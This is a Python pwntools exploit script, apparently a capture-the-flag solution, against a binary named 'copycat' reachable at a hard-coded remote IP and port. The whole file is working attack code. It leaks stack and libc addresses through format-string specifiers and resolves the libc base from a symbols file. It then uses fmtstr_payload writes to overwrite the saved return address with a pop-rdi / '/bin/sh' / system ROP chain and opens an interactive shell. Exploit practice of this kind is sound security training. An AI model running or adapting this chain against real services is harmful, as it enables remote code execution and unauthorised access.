#!/usr/bin/python2
from pwn import *
from sys import *

context.arch = "amd64"
# context.arch = "i386"
# context.log_level = 'DEBUG'

#libc = ELF('libc.so.6', checksec=False)
#libc = ELF('/usr/lib32/libc.so.6')


e = ELF('copycat')
elfROP = ROP(e)

if(len(argv) == 2):
    p = connect("167.71.207.218", 50601)
else:
    p = process('copycat')
    # p = gdb.debug('copycat', cmd)



# _IO_2_1_stdout_
# p.sendline("%10$p")

# 0x7ffff7e1a868
# p.sendline("%12$p")

p.sendline("%29$p")
p.sendline("%33$p")
p.sendline("%30$p")
cmd = """
pie 0x00000000000012CC
"""
if(len(argv) == 3):
    gdb.attach(p, cmd)
p.recvuntil("?")
p.recvline()
# for i in range(100):
#     print p.recv()
leak1 = p.recvline()
leak2 = p.recvline()
leak3 = p.recvline()


leak1int = eval(leak1)
leak2int = eval(leak2)
leak3int = eval(leak3)

# leak1int = (u64(leak1 + "\x00\x00"))
# leak2int = (u64(leak2 + "\x00\x00"))
# print("leak1", hex(leak1int))
# print("leak2", hex(leak2int))


leakoffset = 0x7fffffffdc28 - 0x00007ffffffdd000
ripoffset = 0x7fffffffdae8 - 0x00007ffffffdd000

print("leak1", hex(leak1int))
print("leak2", hex(leak2int))
print("leak stack", hex(leak3int))
stack = leak3int - leakoffset
ripstack = stack + ripoffset 
print("stack", hex(ripstack))

"""

0x0240b3
$ one_gadget libc6_2.31-0ubuntu9.7_amd64.so                                        1
0xe3b2e execve("/bin/sh", r15, r12)
constraints:
  [r15] == NULL || r15 == NULL
  [r12] == NULL || r12 == NULL

0xe3b31 execve("/bin/sh", r15, rdx)
constraints:
  [r15] == NULL || r15 == NULL
  [rdx] == NULL || rdx == NULL

0xe3b34 execve("/bin/sh", rsi, rdx)
constraints:
  [rsi] == NULL || rsi == NULL
  [rdx] == NULL || rdx == NULL


data = [
"libc6_2.31-0ubuntu9.2_amd64",
"libc6_2.31-0ubuntu10_amd64",
"libc6_2.31-0ubuntu9_amd64",
"libc6_2.31-0ubuntu11_amd64",
"libc6_2.31-0ubuntu9.1_amd64",
"libc6_2.31-0ubuntu7_amd64",
"libc6_2.31-0ubuntu8_amd64",
"libc6_2.31-0ubuntu4_amd64",
"libc6_2.31-0ubuntu5_amd64",
"libc6_2.31-0ubuntu1_amd64"
]

"""


data = [
# "libc6_2.31-0ubuntu9.2_amd64",
# "libc6_2.31-0ubuntu10_amd64",
"libc6_2.31-0ubuntu9_amd64",
# "libc6_2.31-0ubuntu11_amd64",
# "libc6_2.31-0ubuntu9.1_amd64",
# "libc6_2.31-0ubuntu7_amd64",
# "libc6_2.31-0ubuntu8_amd64",
# "libc6_2.31-0ubuntu4_amd64",
# "libc6_2.31-0ubuntu5_amd64",
# "libc6_2.31-0ubuntu1_amd64"
]
libcfile = data[0]
# libcfile = "libc"

libc = ELF('{}.so'.format(libcfile), checksec=False)
symbols = open("{}.symbols".format(libcfile)).read()
sym = dict()
listsymb = symbols.strip().split("\n")
# print(symbols)
for i in range(len(listsymb)):
    line = listsymb[i].split(" ")
    sym[line[0]] = int(line[1], 16)

libc.address = leak2int - sym["__libc_start_main_ret"]
# magic = 0xe3b34
# pload_magic = libc.address + magic


print(leak2int)
poprdi = next(libc.search(asm("pop rdi;ret;")))
poprsi = next(libc.search(asm("pop rsi; pop r15;ret;")))
binsh  = next(libc.search('/bin/sh'))
systems  = libc.symbols['system']

pay  = fmtstr_payload(6, {ripstack: poprdi+1}, write_size='byte')
sleep(1)
p.sendline(pay)
p.recvuntil("\x7f")

sleep(1)
pay  = fmtstr_payload(6, {ripstack+8: poprdi}, write_size='byte')
p.sendline(pay)
p.recvuntil("\x7f")

sleep(1)
pay  = fmtstr_payload(6, {ripstack+16: binsh}, write_size='short')
p.sendline(pay)
p.recvuntil("\x7f")

sleep(1)
pay  = fmtstr_payload(6, {ripstack+24: systems}, write_size='short')
p.sendline(pay)
p.recvuntil("\x7f")

sleep(1)

p.sendline("tidakadaboz")
p.interactive()

